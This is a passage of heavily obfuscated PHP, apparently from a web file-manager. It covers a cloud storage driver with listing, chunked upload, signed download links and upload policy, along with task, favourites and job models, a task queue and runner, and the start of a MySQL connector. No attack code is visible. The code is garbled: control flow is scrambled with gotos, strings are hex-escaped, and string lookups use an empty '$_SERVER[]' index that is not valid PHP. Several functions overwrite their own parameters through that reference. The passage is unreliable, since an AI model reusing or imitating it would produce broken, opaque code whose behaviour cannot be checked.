$F[$Fֽ[196]] = !0; if (empty($bܼ)) { $bܼ = $this->objectMeta($B); if (!$bܼ) { return $F; } } goto bݱ; f: $Fֽ =& $_SERVER[]; $F = array($Fֽ[28] => $this->pathThis($B), $Fֽ[76] => $this->getPathOuter($Fֽ[8] . $B), $Fֽ[29] => $Fֽ[77]); if ($Dѵ傊) { return $F; } goto e؇; b樽: } private function listObjs($A王, $F = 0, $e熱 = 1000) { $bם =& $_SERVER[]; $A = array($bם[1350], $bם[1351] . $e熱); if ($F) { $A[] = $bם[1352] . $F; } $a = $this->ussRequest($A王, $bם[228], !1, $A); return !$a[$bם[1093]] ? !1 : $a[$bם[1095]]; } private function fileList($FҌ, &$b즙, &$cٜ, $c = false) { goto D; CҠ赿: if ($fЍ) { $this->cacheMethod($b喱[199], $FҌ, !0); } goto Cܔ; D: $b喱 =& $_SERVER[]; $e = $b喱[33]; $Cຆۮ = 1000; goto E; E: $B朆 = rtrim($FҌ, $b喱[8]) . $b喱[8]; $fЍ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $fЅ = $this->listObjs($FҌ, $e, $Cຆۮ); if (!$fЅ) { return !1; } $e = isset($fЅ[$b喱[1353]]) ? $fЅ[$b喱[1353]] : $b喱[33]; $Cм = isset($fЅ[$b喱[1354]]) ? $fЅ[$b喱[1354]] : array(); foreach ($Cм as $eܪ) { $d = $eܪ[$b喱[29]] == $b喱[77] ? !0 : !1; $D = ltrim($B朆 . $eܪ[$b喱[28]], $b喱[8]) . ($d ? $b喱[8] : $b喱[33]); $fÈ = array($b喱[28] => $D, $b喱[29] => $d ? $b喱[77] : $b喱[193], $b喱[78] => $eܪ[$b喱[335]], $b喱[1349] => $eܪ[$b喱[1355]]); if ($fЍ) { $this->cacheMethod($b喱[199], $D, $d); $this->cacheMethod($b喱[200], $D, $fÈ); } if ($d) { $b즙[] = $D; if ($c) { $this->fileList($D, $b즙, $cٜ, $c); } continue; } $cٜ[] = $fÈ; } if (count($Cм) < $Cຆۮ) { break; } } goto CҠ赿; Cܔ: } public function listPath($f, $DȘʂ = false) { $Aኅ =& $_SERVER[]; $eƃ = $eʅ = array(); $this->fileList($f, $eƃ, $eʅ); foreach ($eƃ as $f => $e鐷ڶ) { $eƃ[$f] = $this->folderInfo($e鐷ڶ, $DȘʂ); } foreach ($eʅ as $f => $e鐷ڶ) { $eʅ[$f] = $this->fileInfo($e鐷ڶ[$Aኅ[28]], $DȘʂ, $e鐷ڶ); } return array($Aኅ[75] => $eƃ, $Aኅ[74] => $eʅ); } public function has($cӐӐ, $C޼ = false, $CЕ = true) { goto C; C: $DԏǙՂ =& $_SERVER[]; $eͺق = $DԏǙՂ[33]; $cӱ× = 500; goto F̵ɲ; cԉ: while (!0) { check_abort(); $C = $this->listObjs($cӐӐ, $eͺق, $cӱ×); if (!$C) { return !1; } $eͺق = isset($C[$DԏǙՂ[1353]]) ? $C[$DԏǙՂ[1353]] : $DԏǙՂ[33]; $c = isset($C[$DԏǙՂ[1354]]) ? $C[$DԏǙՂ[1354]] : array(); if (empty($c)) { break; } $f = array_filter($c, function ($cœØ) { $eԎ =& $_SERVER[]; return $cœØ[$eԎ[29]] == $eԎ[77]; }); $Aڸʓ = count($c); $f = count($f); $fʦ = $Aڸʓ - $f; if ($C޼) { $e袎 += $f; $Dܸ˾ += $fʦ; if ($Aڸʓ < $cӱ×) { break; } continue; } if ($CЕ) { if ($fʦ) { return !0; } } else { if ($f) { return !0; } } if ($Aڸʓ < $cӱ×) { break; } } if ($C޼) { return array($DԏǙՂ[203] => $Dܸ˾, $DԏǙՂ[204] => $e袎); } return !1; goto Dۊł; F̵ɲ: $Dܸ˾ = 0; $e袎 = 0; $F菰 = rtrim($cӐӐ, $DԏǙՂ[8]) . $DԏǙՂ[8]; goto cԉ; Dۊł: } public function listAll($F) { goto e΂˚ԇ; d囅: return $this->listAllFiles($F, array_keys($DՓ), $DՓ); goto A; EÓ: $DՓ = array(); foreach ($Eܼ as $d螑) { $DՓ[$d螑[$c˪[28]]] = $d螑[$c˪[78]]; } foreach ($D as $d螑) { if (is_string($d螑)) { $DՓ[$d螑] = 0; } } goto d囅; e΂˚ԇ: $c˪ =& $_SERVER[]; $D = $Eܼ = array(); $this->fileList($F, $D, $Eܼ, !0); goto EÓ; A: } public function canRead($c⟫) { return $this->exist($c⟫) ? !0 : !1; } public function canWrite($fҕ) { return $this->exist($fҕ) ? !0 : !1; } public function getContent($e؃) { return $this->fileSubstr($e؃, 0, -1); } public function setContent($C۽, $D؂Ք = '') { $f =& $_SERVER[]; if (!$D؂Ք) { $Ë = $this->ussRequest($C۽, $f[224]); return $Ë[$f[1093]]; } $C¢ = $this->tempFile($this->pathThis($C۽)); file_put_contents($C¢, $D؂Ք); if ($this->upload($C۽, $C¢)) { $this->tempFileRemve($C¢); return !0; } return !1; } public function fileSubstr($Cϕ, $BȆ, $B) { $c͛ᬩ =& $_SERVER[]; if (!($Bɱ = $this->link($Cϕ))) { return !1; } $f = !1; if ($B > 0) { $BÑ؆ = $BȆ + $B - 1; $f = array($c͛ᬩ[1316] . $BȆ . $c͛ᬩ[440] . $BÑ؆); } $fҤ = url_request($Bɱ, $c͛ᬩ[228], !1, $f); return $fҤ[$c͛ᬩ[716]] ? $fҤ[$c͛ᬩ[1095]] : !1; } public function upload($D, $aټ, $B = false, $E = REPEAT_REPLACE) { goto c; B: $cѶ = $Eي[$B[1361]]; $F = fopen($aټ, $B[1266]); if (!$F) { return !1; } goto Eڲ; E܌樒: $Dΐɍ = 1024 * 1024 * 10; $EӚ = array($B[1357], $B[1358] . $dԻ, $B[1359], $B[1360] . $Dΐɍ); $EȊ = $this->ussRequest($D, $B[226], !1, $EӚ); goto e׼; fʐ: $EȊ = $this->ussRequest($D, $B[226], !1, $EӚ); return $EȊ[$B[1093]] ? $this->getPathOuter($C˯) : !1; goto A䃥; e׼: if (!$EȊ[$B[1093]]) { return !1; } $Eي = $EȊ[$B[1095]]; $cة = 0; goto B; c: $B =& $_SERVER[]; $dԻ = IO::size($aټ); if ($dԻ <= 1024 * 1024 * 200) { $aĥ = array($B[1356] . $aټ); $EȊ = $this->ussRequest($D, $B[226], $aĥ); return $EȊ[$B[1093]] ? $this->getPathOuter($D) : !1; } goto E܌樒; Eڲ: do { $Cŧ = $Eي[$B[1362]]; fseek_64($F, $cة); $Dᘅ = fread($F, $Cŧ); $f = 0; do { $f++; $Eي = $this->uploadPart($D, $Eي, $Dᘅ); } while (!$Eي && $f < 3); if (!$Eي) { return !1; } $cѶ = $Eي[$B[1361]]; $cة += $Cŧ; } while ($cѶ != -1); fclose($F); $EӚ = array($B[1363], $B[1364] . $Eي[$B[1365]], $B[1359]); goto fʐ; A䃥: } private function uploadPart($C, $e, &$Bòښ) { $A䭹ޙ =& $_SERVER[]; $c임۠ = array($A䭹ޙ[1366], $A䭹ޙ[1364] . $e[$A䭹ޙ[1365]], $A䭹ޙ[1367] . $e[$A䭹ޙ[1361]], $A䭹ޙ[141] . $e[$A䭹ޙ[1362]]); $C = $this->ussRequest($C, $A䭹ޙ[226], $Bòښ, $c임۠); return !$C[$A䭹ޙ[1093]] ? $C[$A䭹ޙ[1093]] : $C[$A䭹ޙ[1095]]; } public function uploadFormData($d, $DۼԨ = 3600) { return $this->uploadPolicy($d, $DۼԨ); } public function multiUploadFormData($Bј̤, $E = 3600) { $cϠ =& $_SERVER[]; $d陹Ќ = (int) $GLOBALS[$cϠ[7]][$cϠ[78]]; return $this->uploadPolicy($Bј̤, $E, $d陹Ќ); } private function uploadPolicy($F, $FΫ = 3600, $d = 0) { goto D֍; D֍: $Fړ =& $_SERVER[]; $e = $Fړ[8] . $this->bucket; $b͆ = gmdate($Fړ[1303]); goto Fԇ; Fԇ: $FΡ = array($Fړ[1368] => $this->bucket, $Fړ[1369] => $F, $Fړ[1370] => time() + $FΫ, $Fړ[1371] => $b͆); if ($d) { $FΡ[$Fړ[1282]] = $d; } $bЌƲϓ = base64_encode(json_encode($FΡ)); goto cż¸; cż¸: $e = base64_encode(hash_hmac($Fړ[1338], "\120\x4f\123\x54\x26{$e}\46{$b͆}\46{$bЌƲϓ}", md5("{$this->userpass}"), !0)); $c❆ = array($Fړ[1208] => $bЌƲϓ, $Fړ[1372] => "\x55\120\131\125\x4e\40{$this->username}\x3a{$e}", $Fړ[175] => $this->endpoint . $e); return $c❆; goto aᙏ; aᙏ: } public function download($D, $Fފ) { goto f; f: $B = IO::getPathInner(IO::mkfile($Fފ)); if (!($CُƷ = $this->link($D))) { return !1; } $F = 0; goto D툕; Fă: fclose($f굃ŝ); return $Fފ; goto AɃ; D툕: $d݄ = 1024 * 200; $f굃ŝ = fopen($B, $_SERVER[][1322]); while (!0) { $a줕޷ = $this->fileSubstr($D, $F, $d݄); if ($a줕޷ === !1) { return !1; } fwrite($f굃ŝ, $a줕޷); $F += $d݄; if (strlen($a줕޷) < $d݄) { break; } } goto Fă; AɃ: } public function link($a, $f㭯 = array()) { $Aհ =& $_SERVER[]; $a = trim($a, $Aհ[8]); if (!empty($this->token)) { $c߮ = strtotime(date($Aհ[1373])); $E = substr(md5($this->token . $Aհ[282] . $c߮ . $Aհ[1374] . $a), 12, 8) . $c߮; $f㭯[] = $Aհ[1375] . $E; } $eìΤ = !empty($f㭯) ? $Aհ[70] . implode($Aհ[282], $f㭯) : $Aհ[33]; return $this->getHost() . $Aհ[8] . $a . $eìΤ; } public function fileOut($C, $D = false, $A߼ = false, $F٢ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($C, $D, $A߼, $F٢); } if (!$A߼) { $A߼ = $this->pathThis($C); } $b = $D ? array($_SERVER[][1376] . rawurlencode($A߼)) : array(); $aѨ = $this->link($C, $b); $this->fileOutLink($aѨ); } public function fileOutServer($DƯŭ, $E = false, $fἥ = false, $aӅ = '') { parent::fileOut($DƯŭ, $E, $fἥ, $aӅ); } public function fileOutImage($fߌ, $a݆ = 250) { $bÿ = $this->link($fߌ . $_SERVER[][1377] . $a݆); $this->fileOutLink($bÿ); } public function fileOutImageServer($A،, $eܨ = 250) { parent::fileOutImage($A،, $eܨ); } public function hashMd5($e횃) { $Dٙɑ =& $_SERVER[]; $aԳ = $this->_objectMeta($e횃); return isset($aԳ[$Dٙɑ[208]]) ? $aԳ[$Dٙɑ[208]] : !1; } public function size($Bۖ) { $C = $this->objectMeta($Bۖ); return $C ? $C[$_SERVER[][78]] : 0; } public function info($E褉) { if ($this->isFolder($E褉)) { return $this->folderInfo($E褉); } else { if ($this->isFile($E褉)) { return $this->fileInfo($E褉); } } return !1; } public function exist($B) { return $this->isFile($B) || $this->isFolder($B); } public function isFile($C) { return !$this->isFolder($C) && $this->objectMeta($C); } public function isFolder($Eɸ) { return $this->cacheMethod($_SERVER[][199], $Eɸ); } protected function objectMeta($c䎇) { return $this->cacheMethod($_SERVER[][200], $c䎇); } protected function _objectMeta($A) { goto dÐ; c: $E = array($dꃤ[29] => isset($d˵[$dꃤ[1379]]) ? $d˵[$dꃤ[1379]] : null, $dꃤ[78] => isset($d˵[$dꃤ[1380]]) ? $d˵[$dꃤ[1380]] : null, $dꃤ[208] => isset($d˵[$dꃤ[1381]]) ? $d˵[$dꃤ[1381]] : null, $dꃤ[1348] => isset($d˵[$dꃤ[1382]]) ? $d˵[$dꃤ[1382]] : null); $E[$dꃤ[1349]] = isset($d˵[$dꃤ[1383]]) ? strtotime($d˵[$dꃤ[1383]]) : $E[$dꃤ[1348]]; return $E; goto c؂; dÐ: $dꃤ =& $_SERVER[]; if ($A == $dꃤ[33] || $A == $dꃤ[8]) { return array(); } $dˊ = $this->ussRequest($A, $dꃤ[1378]); goto AΨ; AΨ: if (!$dˊ[$dꃤ[1093]]) { return null; } $d˵ = isset($dˊ[$dꃤ[1095]]) ? $dˊ[$dꃤ[1095]] : array(); if (!isset($d˵[$dꃤ[1379]])) { return null; } goto c; c؂: } protected function _isFolder($D) { $B =& $_SERVER[]; if ($D == $B[33] || $D == $B[8]) { return !0; } $a׶ = $this->_objectMeta($D); return isset($a׶[$B[29]]) && $a׶[$B[29]] == $B[77] ? !0 : !1; } } goto eơʄ; dҐ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\164\141\163\153\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\164\x79\160\145", "\145\166\x65\156\x74", "\x74\151\155\145", "\x64\x65\x73\x63", "\x73\x79\163\x74\x65\155", "\x65\x6e\x61\142\154\145", "\x6c\x61\x73\164\122\x75\156", "\x73\157\x72\164"); public function listData($bι = false, $a݃¿ = "\x73\157\x72\164", $a݋ = false) { return parent::listData($bι, $a݃¿, $a݋); } public function add($d˿) { $c =& $_SERVER[]; $B = $this->findByName($d˿[$c[28]]); if ($B) { return !1; } $d˿[$c[1498]] = 0; $d˿[$c[1724]] = $this->getSort(); return parent::insert($d˿); } private function getSort() { $f񌿭 =& $_SERVER[]; $c􅉟͏ = parent::listData(); $aɻ = array_to_keyvalue($c􅉟͏, $f񌿭[33], $f񌿭[1724]); return empty($aɻ) ? 0 : max($aɻ) + 1; } public function update($D, $DŅ) { $e˷׊ =& $_SERVER[]; $e݊ܬ = $this->listData($D); $dՂ = $this->findByName($DŅ[$e˷׊[28]]); if (!$e݊ܬ || $dՂ && $dՂ[$e˷׊[393]] != $e݊ܬ[$e˷׊[393]]) { return !1; } return parent::update($D, $DŅ); } public function remove($aי, $B = false) { $B =& $_SERVER[]; $C = $this->listData($aי); if (!$C) { return; } if (!$B && $C[$B[1178]] == $B[87]) { return !1; } return parent::remove($aי); } public function enable($f, $Bͳ) { return $this->update($f, array($_SERVER[][2111] => $Bͳ)); } public function run($A) { return $this->update($A, array($_SERVER[][2121] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($C) { $c =& $_SERVER[]; return array($c[1803] => array(USER_ID, $c[2122])); } protected function listData() { $A辖 =& $_SERVER[]; $Eȡű = array($A辖[1525] => USER_ID, $A辖[463] => 0); $Fꊡ = $A辖[2123]; $cֻ = $this->field($Fꊡ)->where($Eȡű)->order($A辖[2124])->select(); return $cֻ ? $cֻ : array(); } protected function resetCache() { } protected function listView() { goto Cˮ; B⑇: $dμ̈ = array($b[410] => array($b[411], $bޖ)); $F˘ʣ = Model($b[796])->listSource($dμ̈, $Dڇ); $F˘ʣ = array_merge($F˘ʣ[$b[74]], $F˘ʣ[$b[75]]); goto aȎ; aȎ: $F˘ʣ = array_to_keyvalue($F˘ʣ, $b[395]); foreach ($C as $A˹ => $B) { $F܇ʶ = $F˘ʣ[$B[$b[76]]]; $F܇ʶ = $F܇ʶ ? $F܇ʶ : array(); $C[$A˹] = array_merge($F܇ʶ, $B); } return $C; goto fڄҔ; Dᧈ: $bޖ = array_to_keyvalue($cԙ, $b[33], $b[76]); if (!$bޖ) { return $C; } $Dڇ = 2000; goto B⑇; Cˮ: $b =& $_SERVER[]; $C = $this->listData(); $cԙ = array_filter_by_field($C, $b[29], $b[409]); goto Dᧈ; fڄҔ: } protected function addFav($bߍЯ, $b⟃ = '', $c䤯 = "\x73\157\x75\x72\x63\x65") { goto c; c: $cݵ =& $_SERVER[]; $ađ = array($cݵ[1525] => USER_ID, $cݵ[463] => 0, $cݵ[415] => $c䤯, $cݵ[414] => $bߍЯ); if ($this->where($ađ)->find()) { return !1; } goto b; b: $ađ = array($cݵ[1525] => USER_ID, $cݵ[463] => 0); $fፏ = $this->where($ađ)->max($cݵ[1724]); if (!$fፏ) { $fፏ = 0; } goto cȂι; cȂι: if (!$b⟃ && $c䤯 == $cݵ[409]) { $Cᜃ = Model($cݵ[1213])->where(array($cݵ[410] => $bߍЯ))->find(); if (!$Cᜃ) { return !1; } $b⟃ = $Cᜃ[$cݵ[28]]; } $b⟃ = $this->getAutoName($b⟃); $BʆѺ = array($cݵ[1525] => USER_ID, $cݵ[463] => 0, $cݵ[413] => $b⟃, $cݵ[414] => $bߍЯ, $cݵ[415] => $c䤯, $cݵ[1705] => $fፏ + 1); goto Aϐ; Aϐ: return $this->add($BʆѺ); goto fӍ; fӍ: } protected function remove($eҶ) { $eю籏 =& $_SERVER[]; $b˿ؘ = array($eю籏[1525] => USER_ID, $eю籏[412] => $eҶ); return $this->where($b˿ؘ)->delete(); } protected function removeByName($D) { $B =& $_SERVER[]; $C = array($B[1525] => USER_ID, $B[413] => $D, $B[463] => 0); return $this->where($C)->delete(); } protected function rename($Aۓ, $D󔩉) { $a =& $_SERVER[]; if ($Aۓ == $D󔩉) { return !1; } $a = $this->getAutoName($D󔩉); if ($D󔩉 != $a) { return !1; } $A껭 = array($a[1525] => USER_ID, $a[463] => 0, $a[28] => $Aۓ); return $this->where($A껭)->save(array($a[28] => $D󔩉)); } protected function resetSort($cȉ) { $bֲš =& $_SERVER[]; $cȉ = is_array($cȉ) ? $cȉ : array(); $Bƽʶ = array($bֲš[1525] => USER_ID); for ($cδ = 0; $cδ < count($cȉ); $cδ++) { $Bƽʶ[$bֲš[412]] = $cȉ[$cδ]; $this->where($Bƽʶ)->save(array($bֲš[1705] => $cδ + 1)); } return !0; } protected function moveTop($Aڊ) { goto f⫺; AË: if (!$Dչ) { return; } $c = $this->field($FÂތ[393])->where($dŮ)->order($FÂތ[2124])->select(); $c = array_to_keyvalue($c, $FÂތ[33], $FÂތ[393]); goto bԍ业; f⫺: $FÂތ =& $_SERVER[]; $dŮ = array($FÂތ[1525] => USER_ID, $FÂތ[463] => 0); $Dչ = $this->where($dŮ)->where(array($FÂތ[28] => $Aڊ))->find(); goto AË; bԍ业: $eƮ = $c; $c = array_remove_value($c, $Dչ[$FÂތ[393]]); array_unshift($c, $Dչ[$FÂތ[393]]); goto Cժ; Cժ: return $this->resetSort($c); goto FΈ; FΈ: } protected function moveBottom($B) { $Cז܍ϳ =& $_SERVER[]; $Cؓ = array($Cז܍ϳ[1525] => USER_ID, $Cז܍ϳ[463] => 0); $c݂ = $this->where($Cؓ)->max($Cז܍ϳ[1724]); $D䩣 = array($Cז܍ϳ[1724] => $c݂ + 1); return $this->where($Cؓ)->where(array($Cז܍ϳ[28] => $B))->save($D䩣); } private function getAutoName($dԤ) { goto d册; d册: $A֔ =& $_SERVER[]; $bĭߋ = array($A֔[1525] => USER_ID, $A֔[463] => 0); $dڡ΢ = $this->field($A֔[28])->where($bĭߋ)->select(); goto fͥɽ; fͥɽ: $dڡ΢ = array_to_keyvalue($dڡ΢, $A֔[33], $A֔[28]); if (!$dڡ΢ || !in_array($dԤ, $dڡ΢)) { return $dԤ; } for ($bƣ = 0; $bƣ < count($dڡ΢); $bƣ++) { if (!in_array($dԤ . "\50{$bƣ}\51", $dڡ΢)) { return $dԤ . "\x28{$bƣ}\51"; } } goto Cʒʪ; Cʒʪ: return $dԤ . "\50{$bƣ}\x29"; goto b½; b½: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\x6a\x6f\142\114\151\163\x74"; public $field = array("\156\141\155\145", "\x64\145\x73\x63", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\x65\154\146\x4a\157\142\x4c\x69\x73\164"; public function listData($F񖰐 = false, $Fۑ = "\x73\157\162\164", $B͡ = false) { return parent::listData($F񖰐, $Fۑ, $B͡); } public function remove($FÞȘ) { return parent::remove($FÞȘ); } public function add($b΅Ǝ) { $eڂ =& $_SERVER[]; if ($this->findByName($b΅Ǝ[$eڂ[28]])) { return !1; } $b΅Ǝ[$eڂ[1724]] = $this->getSort(); return parent::insert($b΅Ǝ); } private function getSort() { $cå =& $_SERVER[]; $Aˈ = parent::listData(); $fݜ = array_to_keyvalue($Aˈ, $cå[33], $cå[1724]); return empty($fݜ) ? 0 : max($fݜ) + 1; } public function update($f, $e俛) { $dɊǮ =& $_SERVER[]; $f = parent::listData($f); $Aح = $this->findByName($e俛[$dɊǮ[28]]); if (!$f || $Aح && $Aح[$dɊǮ[393]] != $f[$dɊǮ[393]]) { return !1; } return parent::update($f, $e俛); } public function setUserJob($e􍄷, $E쌺܄) { goto Aߦ; Aߦ: $EȐ =& $_SERVER[]; if (!is_array($E쌺܄)) { $E쌺܄ = array($E쌺܄); } $EĤ = parent::listData(); goto A𩟘; A𩟘: $f䍑 = array_to_keyvalue($EĤ, $EȐ[28]); $bй = $EȐ[375]; foreach ($E쌺܄ as $F) { if ($f䍑[$F]) { $bй .= $f䍑[$F][$EȐ[393]] . $EȐ[47]; } else { $f = $this->add($F); $bй .= $f . $EȐ[47]; } } goto F; F: $bй = rtrim($bй, $EȐ[47]); Model($EȐ[506])->metaSet($e􍄷, self::JOB_KEY, $bй); goto Eٷ; Eٷ: } public function getUserJob($D) { $aኦ = Model($_SERVER[][506])->metaGet($D); return $this->getUserJobInfo($aኦ[self::JOB_KEY]); } public function getUserJobInfo($e) { goto E􇲂; E􇲂: $aٓ =& $_SERVER[]; $Dѷ˰ = explode($aٓ[47], $e); $B = parent::listData(); goto D; D: $B = array_remove_key($B, $aٓ[194]); $FѪű = array(); foreach ($Dѷ˰ as $f) { if (isset($B[$f])) { $FѪű[] = $B[$f]; } } goto E­; E­: return $FѪű; goto e񍵺; e񍵺: } } goto b؋; D綇: class TaskHttp extends Task { protected function startAfter() { $e =& $_SERVER[]; $eȝ攛 =& $this->task; $eȝ攛[$e[1601]] = 1; Hook::bind($e[1570], array($this, $e[1602])); Hook::bind($e[1572], array($this, $e[1603])); Hook::bind($e[1574], array($this, $e[1604])); } protected function endAfter() { $dωĘ =& $_SERVER[]; Hook::unbind($dωĘ[1570], array($this, $dωĘ[1602])); Hook::unbind($dωĘ[1572], array($this, $dωĘ[1603])); Hook::unbind($dωĘ[1574], array($this, $dωĘ[1604])); } public function progressStart($f) { $D둝 =& $_SERVER[]; $b겱 = curl_getinfo($f); self::log($D둝[1605] . $b겱[$D둝[305]]); self::valueSet($this->task[$D둝[393]], $this->task); } public function progressEnd($F鸵) { $f =& $_SERVER[]; self::log($f[1606] . $this->task[$f[393]]); $this->end(); } public function progress($a, $F卅, $F, $b, $d莓) { $Dð =& $_SERVER[]; $eܸ =& $this->task; if ($d莓 > 0) { $eܸ[$Dð[1028]] = $eܸ[$Dð[1028]] == 0 ? $b : $eܸ[$Dð[1028]]; $eܸ[$Dð[1043]] = $d莓; } else { if ($F > 0) { $eܸ[$Dð[1028]] = $eܸ[$Dð[1028]] == 0 ? $F卅 : $eܸ[$Dð[1028]]; $eܸ[$Dð[1043]] = $F; } } $this->update(); self::log("\x70\162\x6f\x67\x72\145\x73\163\x48\x74\x74\x70\72\144\x6f\167\x6e\72{$F}\x2f{$F卅}\x3b\x20\x75\x70\154\157\141\144\72{$d莓}\x2f{$b}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\163\153\x51\x75\145\x75\x65\x4c\x65\156\147\164\x68"; const QUEUE_DATA = "\164\141\163\x6b\121\x75\145\165\145\104\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($dʛǖ, $AΖ = array(), $Eƈ = '', $Fл = '') { $BϝՆ =& $_SERVER[]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Fл && array_find_by_field(self::$listData, $BϝՆ[93], $Fл)) { return !0; } self::$listData[] = array($BϝՆ[262] => $dʛǖ, $BϝՆ[1607] => $AΖ, $BϝՆ[431] => $Eƈ, $BϝՆ[93] => $Fл); return !0; } public static function addSubmit() { $fԾ =& $_SERVER[]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($fԾ[1608] . json_encode_force(array_to_keyvalue(self::$listData, $fԾ[33], $fԾ[431])), $fԾ[1609]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($C߾, $aԍ = array(), $aҢ = '', $Bʍ = '') { goto dޡ; b㛕ڊ: if ($Bʍ && array_find_by_field($a, $DΠ[93], $Bʍ)) { return !0; } $a[] = array($DΠ[262] => $C߾, $DΠ[1607] => $aԍ, $DΠ[431] => $aҢ, $DΠ[93] => $Bʍ); write_log($DΠ[1608] . $aҢ, $DΠ[1609]); goto F̉; F̉: self::setAll($a); return !0; goto aڿ; dޡ: $DΠ =& $_SERVER[]; if (self::count() >= self::MAX_LENGTH) { return !1; } $a = self::getAll(); goto b㛕ڊ; aڿ: } public static function run() { goto c; C: try { Hook::apply($c韱[$F[262]], $c韱[$F[1607]]); } catch (Exception $dè迠) { } $Cƾ啩 = number_format(timeFloat() - $AŨ, 3) . $F[1546]; write_log($F[1610] . $c韱[$F[431]] . $F[1611] . $Cƾ啩, $F[1609]); goto AՑ; c: $F =& $_SERVER[]; $D = self::getAll(); $c韱 = array_shift($D); goto A; A: if (!$c韱) { return !1; } self::setAll($D); $AŨ = timeFloat(); goto C; AՑ: return !0; goto Dۥ; Dۥ: } public static function count() { $A٧Ҋ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$A٧Ҋ) { return 0; } return intval($A٧Ҋ); } public static function getAll() { $c = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$c) { return array(); } return $c; } public static function setAll($a׈Ո) { $d = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($a׈Ո), $d); Cache::set(self::QUEUE_DATA, $a׈Ո, $d); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($cۚ, $B˦ = 5.0) { if (!$cۚ) { return; } $C = Cache::get($cۚ); if (!$C || timeFloat() - floatVal($C) >= $B˦) { Cache::set($cۚ, timeFloat(), $B˦ * 10); return !0; } return !1; } public static function timeLimitCall($eȖ, $e, $f达, $b՝ = 5.0) { goto DЭ޲; DЭ޲: $b繼 =& $_SERVER[]; if (!$eȖ || !$e) { return; } self::$asyncAdd = !0; goto D؈; D: Cache::set($Eݞ, $aИ, 60); Cache::removeMemory($Eݞ); write_log($b繼[1615] . $eȖ . $b繼[68] . $e, $b繼[1609]); goto d; Fǉ: if (is_array($aИ[$eȖ])) { $aú[$b繼[1614]] = $aИ[$eȖ][$b繼[1614]]; } if (is_array($aИ[$eȖ])) { if (timeFloat() - $aИ[$eȖ][$b繼[1613]] < $aú[$b繼[197]] * 0.3) { return; } $aú[$b繼[1614]] = $aИ[$eȖ][$b繼[1614]]; } $aИ[$eȖ] = $aú; goto D; D؈: $Eݞ = $b繼[1612]; $aИ = Cache::get($Eݞ, !0); $aú = array($b繼[1613] => timeFloat(), $b繼[1614] => timeFloat(), $b繼[262] => $e, $b繼[1607] => $f达, $b繼[197] => $b՝); goto Fǉ; d: } public static function timeLimitCallLoop() { goto aݞ; bѧ: if (!$fƏ || count($fƏ) <= 0) { return; } $a = !1; $B̵¦ = timeFloat(); goto Bژ; F: if (!$aκ && !self::$asyncAdd) { return; } $d٫ = $a΃[1612]; $fƏ = Cache::get($d٫, !0); goto bѧ; e֝: if (!$fﾦ) { return Cache::remove($d٫); } Cache::set($d٫, $fﾦ, 60); Cache::removeMemory($d٫); goto D; aݞ: $a΃ =& $_SERVER[]; $B = array($a΃[1616]); $aκ = in_array(strtolower(ACTION), $B); goto F; Bژ: $fﾦ = array(); foreach ($fƏ as $F => $eծ) { if ($B̵¦ - $eծ[$a΃[1614]] > $eծ[$a΃[197]]) { $a = !0; try { Hook::apply($eծ[$a΃[262]], $eծ[$a΃[1607]]); write_log($a΃[1617] . $F . $a΃[68] . $eծ[$a΃[262]] . $a΃[1618] . ACTION, $a΃[1609]); } catch (Exception $F̄Օ) { } continue; } $fﾦ[$F] = $eծ; } if (!$a) { return; } goto e֝; D: } public static function finished($bȖɥ, $B㮈) { $bƨ =& $_SERVER[]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($bƨ[262] => $bȖɥ, $bƨ[1607] => $B㮈); } private static function finishedRun() { $bÈ =& $_SERVER[]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $eఉ) { try { Hook::apply($eఉ[$bÈ[262]], $eఉ[$bÈ[1607]]); } catch (Exception $F׷) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto C; dݯ̈́: class DbMysql extends Db { public function __construct($Aꕏ = '') { $cԟĢ =& $_SERVER[]; if (!extension_loaded($cԟĢ[765])) { think_exception(think_lang($cԟĢ[10]) . $cԟĢ[852]); } if (!empty($Aꕏ)) { $this->config = $Aꕏ; if (empty($this->config[$cԟĢ[13]])) { $this->config[$cԟĢ[13]] = $cԟĢ[33]; } } } public function connect($Bݐ = '', $aڐ = 0, $B = false) { $e޾ =& $_SERVER[]; if (!isset($this->linkID[$aڐ])) { goto f; f: if (empty($Bݐ)) { $Bݐ = $this->config; } $Dװԑ = $Bݐ[$e޾[853]] . ($Bݐ[$e޾[854]] ? "\x3a{$Bݐ[$e޾[854]]}" : $e޾[33]); $eհ = !empty($Bݐ[$e޾[13]][$e޾[14]]) ? $Bݐ[$e޾[13]][$e޾[14]] : $this->pconnect; goto bǔ; Dܖ: mysql_query($e޾[857] . think_config($e޾[858]) . $e޾[55], $this->linkID[$aڐ]); if ($dζ > $e޾[859]) { mysql_query($e޾[860], $this->linkID[$aڐ]); } $this->connected = !0; goto a; a: if (1 != think_config($e޾[18])) { unset($this->config); } goto aȖ; bǔ: if ($eհ) { $this->linkID[$aڐ] = mysql_pconnect($Dװԑ, $Bݐ[$e޾[855]], $Bݐ[$e޾[856]], 131072); } else { $this->linkID[$aڐ] = mysql_connect($Dװԑ, $Bݐ[$e޾[855]], $Bݐ[$e޾[856]], !0, 131072); } if (!$this->linkID[$aڐ] 